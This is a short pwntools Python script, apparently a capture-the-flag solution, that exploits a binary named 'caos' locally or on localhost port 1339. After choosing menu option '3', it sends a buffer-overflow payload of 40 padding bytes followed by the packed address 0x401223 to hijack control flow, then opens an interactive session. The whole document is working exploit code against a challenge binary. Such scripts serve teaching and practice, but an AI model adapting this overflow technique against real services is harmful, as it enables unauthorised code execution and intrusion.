#!/usr/bin/env python3

from pwn import *

exe = ELF("./caos")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("localhost", 1339)

    return r


def main():
    r = conn()
    
    r.sendlineafter(b"flag", b"3")
    r.sendlineafter(b"....", b"A"*32 + b"B"*8 + p64(0x401223))

    r.interactive()


if __name__ == "__main__":
    main()
